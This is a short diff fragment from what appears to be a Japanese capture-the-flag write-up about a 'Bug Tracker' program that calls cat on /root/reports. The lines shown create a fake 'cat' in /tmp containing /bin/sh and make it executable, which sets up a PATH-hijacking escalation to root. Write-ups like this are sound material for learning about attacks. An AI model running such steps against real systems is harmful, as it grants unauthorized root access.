@@ -101,6 +101,7 @@ Bug Trackerは/root/reportsディレクリ内にcatを使用することを確�
 ![f5982646e76314fb6222c9e8a0486f5e.png](../_resources/f5982646e76314fb6222c9e8a0486f5e.png)
 
 catに"bin/sh"を入れrootまでのパスを設定する
+
 $ cd /tmp
 $ echo "/bin/sh" > cat
 $ chmod +x cat  
